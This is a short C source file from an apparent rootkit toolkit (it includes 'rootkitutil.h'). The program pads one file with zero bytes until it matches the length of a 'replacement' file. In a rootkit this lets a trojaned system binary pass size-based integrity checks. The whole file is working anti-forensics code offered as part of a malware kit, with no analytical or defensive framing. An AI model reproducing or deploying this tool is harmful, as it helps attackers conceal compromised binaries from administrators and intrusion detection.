#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

#include "rootkitutil.h"

/* 
 * Changes the length of a file by adding filler zero's to the end
 * 
 * by Method
 */

main(int argc, char **argv)
{
	int fd;
	long pos1,pos2,diff;
	char *buf;

	BASENAME(argv[0]);

	if(argc!=3)
		USAGE("original replacement")

	if((fd=open(argv[1],O_RDONLY))<0)
		ERR("open")

	pos1=lseek(fd,0,SEEK_END);

	close(fd);

	if((fd=open(argv[2],O_RDONLY))<0)
		ERR("open")

	pos2=lseek(fd,0,SEEK_END);

	close(fd);

	if((diff=pos2-pos1)<=0) {
		fprintf(stderr,"%s: %s is >= than %s, no changes made.\n",RK_PROG,argv[1],argv[2]);
		exit(1);
	}

	if((fd=open(argv[1],O_WRONLY|O_APPEND))<0) 
		ERR("open")

	lseek(fd,0,SEEK_END);

	buf=(char *)malloc(diff);

	memset(buf,0x00,diff);

	if(write(fd,buf,diff)<0)
		ERR("write")

	printf("%s: wrote %d bytes to %s.\n",RK_PROG,diff,argv[1]);
	exit(0);
}

